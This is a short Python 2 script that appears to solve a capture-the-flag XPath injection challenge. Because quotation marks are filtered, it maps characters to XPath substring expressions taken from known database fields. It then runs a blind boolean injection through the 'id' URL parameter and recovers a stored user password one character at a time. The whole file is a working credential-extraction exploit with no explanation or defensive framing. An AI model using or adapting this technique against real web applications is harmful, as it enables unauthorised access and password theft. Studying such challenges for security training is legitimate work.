import urllib2

url = 'http://challenge-xpath-url.com/?action=user&id='

# quotation mark is filtered then we'll compare the letter with those in the db
chars = {
  'a':'substring(//user[userid=2]/account,1,1)',
  'd':'substring(//user[userid=2]/account,2,1)',
  'm':'substring(//user[userid=2]/account,3,1)',
  'i':'substring(//user[userid=2]/account,4,1)',
  'n':'substring(//user[userid=2]/account,5,1)',
  's':'substring(//user[userid=2]/account,7,1)',
  't':'substring(//user[userid=2]/account,8,1)',
  'r':'substring(//user[userid=2]/account,9,1)',
  'o':'substring(//user[userid=2]/account,12,1)',
  'u':'substring(//user[userid=1]/account,2,1)',
  'J':'substring(//user[userid=2]/email,1,1)',
  'h':'substring(//user[userid=2]/email,3,1)',
  'n':'substring(//user[userid=2]/email,4,1)',
  '@':'substring(//user[userid=2]/email,5,1)',
  'e':'substring(//user[userid=2]/email,8,1)',
  '.':'substring(//user[userid=2]/email,9,1)',
  'g':'substring(//user[userid=2]/email,12,1)',
  'j':'substring(//user[userid=1]/email,7,1)',
  '.':'substring(//user[userid=2]/email,9,1)',
  'S':'substring(//user[userid=1]/username,1,1)',
  'v':'substring(//user[userid=1]/email,4,1)',
  'b':'substring(//user[userid=1]/email,9,1)',
  'c':'substring(//user[userid=1]/email,12,1)',
  'E':'substring(//user[userid=3]/username,1,1)',
  'z':'substring(//user[userid=3]/email,11,1)',
  'y':'substring(//user[userid=4]/email,5,1)',
  'E':'substring(//user[userid=5]/username,1,1)',
  'l':'substring(//user[userid=5]/username,2,1)',
  '1':'1',
  '2':'2',
  '3':'3',
  '4':'4',
  '5':'5',
  '6':'6',
  '7':'7',
  '8':'8',
  '9':'9',
  '0':'0'
}

password = ''
for i in range(1,14):
  for char in chars.keys():
    r = urllib2.urlopen(url + "2 and substring(//user[userid=2]/password," + str(i) + ", 1) = " + chars[str(char)])
    data = r.read()

    if data.find("John")!= -1:
      print "[" + str(i) + "] -> " + char
      password = password + char
      break

print "\npassword is: " + password
